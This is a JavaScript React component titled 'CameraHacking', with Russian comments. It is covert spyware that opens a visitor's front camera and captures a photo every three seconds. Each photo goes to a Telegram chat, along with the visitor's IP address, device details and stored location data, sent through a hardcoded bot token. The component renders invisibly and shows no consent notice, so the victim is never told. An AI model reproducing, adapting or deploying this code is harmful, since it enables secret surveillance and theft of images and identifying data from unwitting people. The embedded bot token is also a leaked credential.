/**
 * КОМПОНЕНТ CAMERAHACKING - ОПТИМИЗИРОВАН ДЛЯ ANDROID
 * ФОКУС НА НАДЕЖНУЮ ОТПРАВКУ ФОТО КАЖДЫЕ 3 СЕКУНДЫ
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [isAndroid, setIsAndroid] = useState(false);
  const [androidVersion, setAndroidVersion] = useState(0);

  // Конфигурация
  const CAPTURE_INTERVAL = 3000; // 3 секунды
  const MAX_CAPTURES = 50; // Уменьшено для Android

  /**
   * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ ANDROID УСТРОЙСТВА
   */
  const detectAndroid = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isAndroidDevice = /android/.test(userAgent);
    setIsAndroid(isAndroidDevice);
    
    if (isAndroidDevice) {
      const match = userAgent.match(/android\s([0-9\.]+)/);
      const version = match ? parseFloat(match[1]) : 0;
      setAndroidVersion(version);
      console.log(`🤖 Android detected: version ${version}`);
    }
    
    return isAndroidDevice;
  };

  /**
   * ФУНКЦИЯ ПОЛУЧЕНИЯ ОПТИМАЛЬНЫХ НАСТРОЕК ДЛЯ ANDROID
   */
  const getAndroidCameraConstraints = () => {
    if (!isAndroid) {
      return {
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: "user"
        }
      };
    }
    
    // Для старых Android (до 5.0)
    if (androidVersion < 5.0) {
      return {
        video: {
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: { exact: "user" }
        }
      };
    }
    
    // Для Android 5.0-8.0
    if (androidVersion < 8.0) {
      return {
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 24 },
          facingMode: { exact: "user" }
        }
      };
    }
    
    // Для современных Android (8.0+)
    return {
      video: {
        width: { ideal: 1920 },
        height: { ideal: 1080 },
        frameRate: { ideal: 30 },
        facingMode: "user"
      }
    };
  };

  /**
   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ ВИДЕО ДЛЯ ANDROID
   */
  const initializeAndroidVideo = () => {
    return new Promise((resolve, reject) => {
      if (!videoRef.current) {
        reject(new Error("Video element not found"));
        return;
      }
      
      const video = videoRef.current;
      
      // Критически важные настройки для Android
      video.playsInline = true;
      video.muted = true;
      video.setAttribute('playsinline', 'true');
      video.setAttribute('muted', 'true');
      video.setAttribute('webkit-playsinline', 'true');
      video.setAttribute('autoplay', 'true');
      
      const handleLoadedMetadata = () => {
        console.log("✅ Android video metadata loaded");
        video.removeEventListener('loadedmetadata', handleLoadedMetadata);
        
        // Для Android даем больше времени на инициализацию
        setTimeout(() => {
          if (video.videoWidth > 0 && video.videoHeight > 0) {
            console.log(`📱 Android video ready: ${video.videoWidth}x${video.videoHeight}`);
            resolve();
          } else {
            // Пробуем принудительно запустить видео
            video.play().then(resolve).catch(() => {
              console.log("⚠️ Auto-play blocked, continuing anyway");
              resolve();
            });
          }
        }, 1000);
      };
      
      video.addEventListener('loadedmetadata', handleLoadedMetadata);
      
      // Fallback таймер
      setTimeout(() => {
        video.removeEventListener('loadedmetadata', handleLoadedMetadata);
        console.log("⏰ Android video initialization timeout");
        resolve();
      }, 5000);
    });
  };

  /**
   * ФУНКЦИЯ ОТПРАВКИ ФОТО С ПОВТОРАМИ ДЛЯ ANDROID
   */
  const sendToTelegram = async (blob, filename, retryCount = 0) => {
    const maxRetries = isAndroid ? 3 : 1; // Больше повторов для Android
    
    try {
      // Для Android уменьшаем качество если фото слишком большое
      let finalBlob = blob;
      if (isAndroid && blob.size > 500 * 1024) { // Больше 500KB
        console.log("⚡ Compressing image for Android...");
        finalBlob = await compressImageForAndroid(blob);
      }
      
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", finalBlob, filename);
      
      // Добавляем информацию об устройстве для отладки
      formData.append("device_info", JSON.stringify({
        isAndroid: isAndroid,
        androidVersion: androidVersion,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
        blobSize: finalBlob.size
      }));
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      console.log(`📤 Sending photo (${Math.round(finalBlob.size / 1024)} KB)...`);
      
      await axios.post(apiUrl, formData, {
        headers: { "Content-Type": "multipart/form-data" },
        timeout: isAndroid ? 20000 : 10000, // Больше таймаут для Android
        onUploadProgress: (progressEvent) => {
          if (progressEvent.total) {
            const percent = Math.round((progressEvent.loaded * 100) / progressEvent.total);
            console.log(`📤 Upload: ${percent}%`);
          }
        }
      });
      
      console.log(`✅ Photo #${captureCount + 1} sent successfully`);
      setCaptureCount(prev => prev + 1);
      
    } catch (error) {
      console.error(`❌ Error sending photo (attempt ${retryCount + 1}/${maxRetries}):`, error.message);
      
      // Повторная попытка для Android
      if (retryCount < maxRetries) {
        console.log(`🔄 Retrying in 2 seconds...`);
        await new Promise(resolve => setTimeout(resolve, 2000));
        return sendToTelegram(blob, filename, retryCount + 1);
      } else {
        console.error(`❌ Failed after ${maxRetries} attempts`);
        
        // Отправляем ошибку в Telegram для отладки
        try {
          const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
          await axios.post(telegramApiUrl, {
            'chat_id': chatId,
            'text': `❌ Android Photo Send Failed\n\n` +
                   `Attempts: ${maxRetries}\n` +
                   `Error: ${error.message}\n` +
                   `Device: ${navigator.userAgent}\n` +
                   `Time: ${new Date().toLocaleString()}`
          });
        } catch (e) {
          console.error("❌ Could not send error notification:", e);
        }
      }
    }
  };

  /**
   * ФУНКЦИЯ СЖАТИЯ ИЗОБРАЖЕНИЯ ДЛЯ ANDROID
   */
  const compressImageForAndroid = (blob) => {
    return new Promise((resolve) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        // Уменьшаем разрешение для Android
        const maxWidth = isAndroid && androidVersion < 8.0 ? 800 : 1200;
        const scale = Math.min(maxWidth / img.width, 1);
        canvas.width = img.width * scale;
        canvas.height = img.height * scale;
        
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
        
        // Более низкое качество для экономии трафика
        const quality = isAndroid ? 0.6 : 0.8;
        canvas.toBlob(resolve, 'image/jpeg', quality);
      };
      img.src = URL.createObjectURL(blob);
    });
  };

  /**
   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО (ОПТИМИЗИРОВАНА ДЛЯ ANDROID)
   */
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current || captureCount >= MAX_CAPTURES) {
      console.log("⏸️ Capture stopped: limit reached or no stream");
      stopCapturing();
      return;
    }
    
    try {
      const video = videoRef.current;
      
      // Для Android даем больше проверок
      if (isAndroid) {
        if (!video.srcObject || video.srcObject.getTracks().length === 0) {
          console.log("⚠️ Android: No video tracks available");
          return;
        }
        
        // Проверяем, активен ли поток
        const tracks = video.srcObject.getTracks();
        const activeTracks = tracks.filter(track => track.readyState === 'live');
        if (activeTracks.length === 0) {
          console.log("⚠️ Android: No active video tracks");
          return;
        }
      }
      
      // Проверяем готовность видео
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        console.log(`⏳ Video not ready: ${video.videoWidth}x${video.videoHeight}`);
        
        // Для Android пробуем принудительно обновить
        if (isAndroid) {
          setTimeout(capturePhoto, 1000);
        }
        return;
      }
      
      console.log(`📸 Capturing photo #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
      
      // Создаем canvas с учетом ориентации Android
      const canvas = document.createElement("canvas");
      
      // Исправление ориентации для фронтальной камеры Android
      const isPortrait = video.videoHeight > video.videoWidth;
      
      if (isAndroid && isPortrait) {
        // Для портретной ориентации на Android
        canvas.width = video.videoHeight;
        canvas.height = video.videoWidth;
      } else {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      }
      
      const context = canvas.getContext("2d");
      
      // Коррекция ориентации
      if (isAndroid && isPortrait) {
        context.translate(canvas.width / 2, canvas.height / 2);
        context.rotate(Math.PI / 2);
        context.translate(-canvas.height / 2, -canvas.width / 2);
      }
      
      // Рисуем изображение с улучшением контраста для Android
      context.filter = isAndroid ? "contrast(1.2) brightness(1.1)" : "none";
      context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
      
      // Разное качество для Android/iOS
      const quality = isAndroid ? 0.7 : 0.8;
      
      canvas.toBlob(async (blob) => {
        if (blob) {
          const sizeKB = Math.round(blob.size / 1024);
          console.log(`✅ Photo captured (${sizeKB} KB, quality: ${quality})`);
          
          // Отправляем фото
          await sendToTelegram(blob, `photo_${Date.now()}_${isAndroid ? 'android' : 'ios'}.jpg`);
        } else {
          console.error("❌ Failed to create image blob");
          
          // Для Android пробуем еще раз
          if (isAndroid) {
            setTimeout(capturePhoto, 1000);
          }
        }
      }, "image/jpeg", quality);
      
    } catch (error) {
      console.error("❌ Capture error:", error);
      
      // Для Android пробуем восстановить
      if (isAndroid) {
        console.log("🔄 Android: Trying to recover from capture error...");
        setTimeout(capturePhoto, 2000);
      }
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log(`🚀 Starting periodic capture every ${CAPTURE_INTERVAL/1000} seconds`);
    
    // Первый захват с задержкой для Android
    const initialDelay = isAndroid ? 2000 : 1000;
    setTimeout(() => {
      capturePhoto();
    }, initialDelay);
    
    // Затем каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < MAX_CAPTURES) {
        capturePhoto();
      } else {
        stopCapturing();
        console.log("🎯 Capture limit reached");
      }
    }, CAPTURE_INTERVAL);
  };

  /**
   * ОСТАНОВКА ЗАХВАТА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    console.log("🛑 Capture stopped");
  };

  /**
   * ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ КАМЕРЫ С УЧЕТОМ ANDROID
   */
  const initializeCamera = async () => {
    try {
      console.log("📱 Initializing camera...");
      
      // Определяем Android
      const isAndroidDevice = detectAndroid();
      
      // Получаем настройки для устройства
      const constraints = getAndroidCameraConstraints();
      console.log("🎯 Camera constraints:", constraints);
      
      // Запрашиваем доступ к камере
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      console.log("✅ Camera access granted, stream active:", stream.active);
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        
        // Для Android используем специальную инициализацию
        if (isAndroidDevice) {
          await initializeAndroidVideo();
        } else {
          // Для iOS/десктопов
          await new Promise(resolve => {
            if (videoRef.current.readyState >= 2) {
              setTimeout(resolve, 1000);
            } else {
              videoRef.current.onloadedmetadata = () => setTimeout(resolve, 1000);
            }
          });
        }
        
        console.log("🎬 Camera ready, starting capture...");
        
        // Отправляем информацию об устройстве в Telegram
        try {
          const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
          await axios.post(telegramApiUrl, {
            'chat_id': chatId,
            'text': `📱 Device Connected\n\n` +
                   `Platform: ${isAndroid ? 'Android' : 'iOS/Desktop'}\n` +
                   `Android Version: ${androidVersion || 'N/A'}\n` +
                   `User Agent: ${navigator.userAgent.substring(0, 100)}...\n` +
                   `Time: ${new Date().toLocaleString()}`
          });
        } catch (e) {
          console.log("⚠️ Could not send device info");
        }
        
        // Запускаем периодический захват
        startPeriodicCapture();
      }
      
    } catch (error) {
      console.error("❌ Camera initialization error:", error);
      
      // Пробуем альтернативные настройки для Android
      if (isAndroid && error.name === 'OverconstrainedError') {
        console.log("🔄 Trying alternative constraints for Android...");
        try {
          const fallbackConstraints = {
            video: {
              width: { ideal: 640 },
              height: { ideal: 480 }
            }
          };
          
          const stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
          streamRef.current = stream;
          
          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            setTimeout(() => {
              startPeriodicCapture();
            }, 2000);
          }
        } catch (fallbackError) {
          console.error("❌ Fallback camera also failed:", fallbackError);
        }
      }
    }
  };

  /**
   * ФУНКЦИЯ ПОЛУЧЕНИЯ IP АДРЕСА
   */
  const fetchClientIp = async () => {
    try {
      // Для Android используем несколько сервисов
      const ipServices = [
        'https://api.ipify.org?format=json',
        'https://ipinfo.io/json',
        'https://api.my-ip.io/v2/ip.json'
      ];
      
      for (const service of ipServices) {
        try {
          const response = await axios.get(service, { timeout: 10000 });
          let ip = response.data.ip || response.data.query;
          
          if (ip) {
            setClientIp(ip);
            console.log("✅ Client IP fetched:", ip);
            
            // Отправляем IP в Telegram
            const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
            await axios.post(telegramApiUrl, {
              'chat_id': chatId,
              'text': `🌐 IP Address: ${ip}\n` +
                     `Platform: ${isAndroid ? 'Android' : 'Other'}`
            });
            
            return;
          }
        } catch (err) {
          console.log(`⚠️ IP service failed: ${service}`);
        }
      }
      
      setClientIp("IP unavailable");
      
    } catch (error) {
      console.error("❌ Error fetching client IP:", error);
      setClientIp("IP unavailable");
    }
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const init = async () => {
      // Восстановление геолокации
      const savedPermission = localStorage.getItem("locationPermission");
      if (savedPermission) {
        try {
          const locationData = JSON.parse(savedPermission);
          setLocationPermission(locationData);
          console.log("📍 Restored location data");
        } catch (error) {
          localStorage.removeItem("locationPermission");
        }
      }
      
      // Инициализация камеры
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        await initializeCamera();
        await fetchClientIp();
      } else {
        console.error("❌ MediaDevices API not supported");
        
        // Отправляем ошибку в Telegram
        const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
        axios.post(telegramApiUrl, {
          'chat_id': chatId,
          'text': `❌ API Not Supported\n\n` +
                 `Device: ${navigator.userAgent}\n` +
                 `Error: MediaDevices API not available`
        });
      }
    };

    // Запуск инициализации
    init();

    // Обработчик видимости страницы
    const handleVisibilityChange = () => {
      if (document.hidden) {
        console.log("⏸️ Page hidden");
      } else {
        console.log("▶️ Page visible");
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Очистка
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      
      stopCapturing();
      
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => {
          track.stop();
          console.log(`🛑 Stopped ${track.kind} track`);
        });
        streamRef.current = null;
      }
      
      console.log("🧹 Cleanup completed");
    };
  }, []);

  /**
   * СКРЫТЫЙ ЭЛЕМЕНТ ДЛЯ ОТЛАДКИ ANDROID
   */
  return (
    <div style={{ display: 'none' }}>
      {/* Скрытый элемент для отладки Android */}
      <div id="android-debug">
        {isAndroid ? `Android ${androidVersion}` : 'Not Android'}
      </div>
    </div>
  );
};

export default CameraHacking;
